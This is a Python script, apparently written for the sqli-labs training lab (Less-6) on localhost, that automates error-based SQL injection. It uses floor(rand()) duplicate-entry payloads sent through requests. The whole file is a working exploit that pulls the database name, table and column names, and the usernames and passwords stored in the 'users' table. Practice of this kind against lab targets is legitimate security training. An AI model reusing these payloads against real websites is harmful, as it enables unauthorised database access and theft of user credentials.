import requests

base="http://localhost/sqli-labs-php7/Less-6/?id=1\" "
factBreak="You are in..."
factTrue="Duplicate entry"

print("E X T R A C T I N G   D A T A   F R O M..."+base)

print("****************************************************************************************************************")
print("D  A   T   A   B   A   S   E       N   A   M   E ")
print("****************************************************************************************************************")

i=0
while 1:
    target="and (select 1 from (select count(*), concat((select database()),'..',floor(rand()*2))a from information_schema.schemata group by a)x) -- -"
    url=base+target
    result=requests.get(url)
    if factTrue in result.text:
        for line in result.text.splitlines():
            if factTrue in line:
                print(line)
                break
        break

print("****************************************************************************************************************")
print("T   A   B   L   E     N   A   M   E   S")
print("****************************************************************************************************************")

i=0
while 1:
    target="and (select 1 from (select count(*), concat((select concat(table_name) from information_schema.tables where table_schema=database() limit "+str(i)+",1), floor(rand()*2))a from information_schema.tables group by a)c) -- -"
    url=base+target
    result=requests.get(url)
    if factBreak in result.text:
        break
    if factTrue in result.text:
        for line in result.text.splitlines():
            if factTrue in line:
                print (line)
        i+=1
        

print("****************************************************************************************************************")
print("C   O   L   U   M   N      N   A   M   E   S")
print("****************************************************************************************************************")

i=0
while(1):
    target="and (select 1 from (select count(*), concat((select concat(column_name) from information_schema.columns where table_name='users' limit "+str(i)+",1), floor(rand()*2))a from information_schema.columns group by a)x) -- -"
    url=base+target
    result=requests.get(url)
    if factBreak in result.text:
        break
    if factTrue in result.text:
        for line in result.text.splitlines():
            if factTrue in line:
                print (line)
        i+=1

print("****************************************************************************************************************")
print("U   S   E   R   N   A   M   E   S")
print("****************************************************************************************************************")

i=0
while (1):
    target="and (select 1 from (select count(*), concat((select concat(username) from users limit "+str(i)+",1), floor(rand()*2))a from users group by a)x) -- -"
    url=base+target
    result=requests.get(url)
    if factBreak in result.text:
        break
    if factTrue in result.text:
        if factTrue in result.text:
            for line in result.text.splitlines():
                if factTrue in line:
                    print (line)
            i+=1
i=1

print("****************************************************************************************************************")
print("P   A   S   S   W   O   R   D   S")
print("****************************************************************************************************************")

while(i):
    target="and (select 1 from (select count(*), concat((select concat(password) from users where id="+str(i)+" limit 0,1), floor(rand()*2))a from users group by a)x)-- -"
    url=base+target
    result=requests.get(url)
    if factBreak in result.text:
        break
    if factTrue in result.text:
        if factTrue in result.text:
            for line in result.text.splitlines():
                if factTrue in line:
                    print (line)
            i+=1
        